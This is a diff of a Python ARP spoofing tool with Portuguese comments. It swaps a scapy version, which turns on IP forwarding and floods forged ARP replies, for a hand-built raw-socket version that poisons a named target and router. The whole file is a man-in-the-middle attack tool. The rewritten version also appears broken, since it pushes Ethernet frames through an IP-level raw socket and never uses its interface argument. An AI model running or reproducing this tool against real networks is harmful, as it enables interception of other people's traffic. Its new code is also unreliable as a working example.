@@ -1,112 +1,88 @@
-# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-# =                          -                                   -=
-# =    ATIVA REDIRECIONAMENTO DE PACOTES                        -=
-# =                          -                                   -=
-# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-def enable_ip_forwarding():
-    """
-    Ativa o redirecionamento de pacotes.
-    Compatível com macOS e Linux.
-    """
-    # Identifica o sistema operacional
-    system = platform.system()
-    if system == "Darwin":  # macOS
-        # Ativa IP forwarding no macOS
-        os.system("sysctl -w net.inet.ip.forwarding=1")
-        print("[INFO] IP Forwarding ativado no macOS.")
-    elif system == "Linux":
-        # Ativa IP forwarding no Linux
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        print("[INFO] IP Forwarding ativado no Linux.")
-    else:
-        # Sistema operacional não suportado
-        print("[ERRO] Sistema não suportado para ativar IP Forwarding.")
-
+import socket
+import dpkt
+import struct
+import time
 
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-# =                          -                                   -=
-# =    OBTÉM ENDEREÇO MAC                                        -=
-# =                          -                                   -=
+# Função para criar um pacote ARP
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-def get_mac(ip):
+def create_arp_packet(opcode: int, sender_mac: str, sender_ip: str, target_mac: str, target_ip: str) -> bytes:
     """
-    Obtém o endereço MAC de um IP usando solicitações ARP.
+    Cria um pacote ARP (Ethernet + ARP Header).
     """
-    print(f"[INFO] Tentando obter o MAC para {ip}...")
+    sender_mac_bytes = bytes.fromhex(sender_mac.replace(":", ""))
+    target_mac_bytes = bytes.fromhex(target_mac.replace(":", ""))
+    sender_ip_bytes = socket.inet_aton(sender_ip)
+    target_ip_bytes = socket.inet_aton(target_ip)
 
-    # Envia pacote ARP para todos os dispositivos da rede
-    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    response, _ = srp(packet, timeout=3, verbose=False)
+    eth_header = struct.pack(
+        "!6s6sH",
+        target_mac_bytes, sender_mac_bytes, 0x0806
+    )
 
-    if response:
-        # Retorna o endereço MAC do primeiro dispositivo respondente
-        mac = response[0][1].hwsrc
-        print(f"[INFO] MAC encontrado para {ip}: {mac}")
-        return mac
-    else:
-        # Consulta a tabela ARP do sistema como fallback
-        result = os.popen(f"arp -n {ip}").read()
-        if ip in result:
-            mac = result.split()[3]
-            if mac != "(incomplete)":
-                print(f"[INFO] MAC encontrado na tabela ARP para {ip}: {mac}")
-                return mac
+    arp_header = struct.pack(
+        "!HHBBH6s4s6s4s",
+        1, 0x0800, 6, 4, opcode,
+        sender_mac_bytes, sender_ip_bytes,
+        target_mac_bytes, target_ip_bytes
+    )
 
-        # Erro ao encontrar o endereço MAC
-        print(f"[ERRO] Não foi possível encontrar o MAC para {ip}.")
-        return None
-
+    return eth_header + arp_header
 
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-# =                          -                                   -=
-# =    REALIZA ARP SPOOFING                                      -=
-# =                          -                                   -=
+# Função principal para realizar o ARP Spoofing
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-def arp_spoof(target_ip, spoof_ip):
+def arp_spoof(interface: str, target_ip: str, router_ip: str, attacker_mac: str) -> None:
     """
-    Realiza ARP Spoofing entre o alvo e o roteador.
+    Realiza o ataque ARP Spoofing.
     """
-    # Valida os IPs fornecidos
-    if not target_ip or not spoof_ip:
-        print("[ERRO] Os IPs do alvo e do roteador devem ser fornecidos.")
-        return
-
-    # Obtém os endereços MAC dos dispositivos
-    target_mac = get_mac(target_ip)
-    spoof_mac = get_mac(spoof_ip)
-
-    # Verifica se os MACs foram obtidos com sucesso
-    if not target_mac or not spoof_mac:
-        print("[ERRO] Não foi possível obter todos os MACs necessários.")
-        return
-
-    # Cria os pacotes ARP Spoofing
-    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    router_packet = ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
-
-    print(f"[INFO] Iniciando ARP spoofing: {target_ip} -> {spoof_ip}")
     try:
-        # Envia os pacotes continuamente para realizar o ataque
-        while True:
-            send(target_packet, verbose=False)
-            send(router_packet, verbose=False)
-    except KeyboardInterrupt:
-        # Interrompe o ataque ao pressionar Ctrl+C
-        print("\n[INFO] ARP spoofing interrompido.")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        print(f"Iniciando ARP Spoofing na interface {interface}...")
+        print(f"Alvo: {target_ip} | Roteador: {router_ip}")
 
+        while True:
+            target_packet = create_arp_packet(
+                opcode=2, sender_mac=attacker_mac,
+                sender_ip=router_ip,
+                target_mac="ff:ff:ff:ff:ff:ff",
+                target_ip=target_ip
+            )
+
+            router_packet = create_arp_packet(
+                opcode=2, sender_mac=attacker_mac,
+                sender_ip=target_ip,
+                target_mac="ff:ff:ff:ff:ff:ff",
+                target_ip=router_ip
+            )
+
+            sock.sendto(target_packet, (target_ip, 0))
+            sock.sendto(router_packet, (router_ip, 0))
+
+            print(f"Pacotes enviados: Alvo -> {target_ip}, Roteador -> {router_ip}")
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print("\nAtaque interrompido pelo usuário.")
+    except Exception as e:
+        print(f"Erro: {e}")
+    finally:
+        sock.close()
 
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-# =                          -                                   -=
-# =    EXECUÇÃO PRINCIPAL                                        -=
-# =                          -                                   -=
+# Entrada principal do programa
 # =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 if __name__ == "__main__":
-    # Ativa o redirecionamento de pacotes no sistema
-    enable_ip_forwarding()
+    import sys
 
-    # Solicita ao usuário os IPs do alvo e do roteador
-    target_ip = input("Digite o IP do alvo: ").strip()
-    spoof_ip = input("Digite o IP do roteador: ").strip()
+    if len(sys.argv) != 5:
+        print("Uso: sudo python3 arp_spoof.py <interface> <IP alvo> <IP roteador> <MAC do atacante>")
+        print("Exemplo: sudo python3 arp_spoof.py en0 192.168.1.5 192.168.1.1 12:34:56:78:9A:BC")
+        sys.exit(1)
 
-    # Executa o ARP Spoofing com os IPs fornecidos
-    arp_spoof(target_ip, spoof_ip)
+    interface = sys.argv[1]
+    target_ip = sys.argv[2]
+    router_ip = sys.argv[3]
+    attacker_mac = sys.argv[4]
+
+    arp_spoof(interface, target_ip, router_ip, attacker_mac)
